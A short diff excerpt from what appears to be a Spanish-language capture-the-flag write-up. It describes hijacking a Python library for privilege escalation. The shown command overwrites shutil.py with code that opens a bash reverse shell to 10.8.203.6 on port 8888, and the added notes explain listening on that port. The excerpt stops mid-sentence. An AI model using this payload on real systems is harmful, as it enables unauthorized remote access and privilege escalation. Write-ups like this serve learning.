@@ -134,4 +134,6 @@ hacemos una peticion con wget al servidor para bajarnos el archivo
 	echo "import os; os.system(\"bash -c 'bash -i >& /dev/tcp/10.8.203.6/8888 0>&1'\")" > /usr/lib/python3.8/shutil.py
 ```
 
-
+### de esta manera vamos a editar la librería y vamos a inyectar una shell y nos pondremos en escucha en el puerto que hemos especificado
+![[Pasted image 20231121225529.png]]
+### de esta manera 
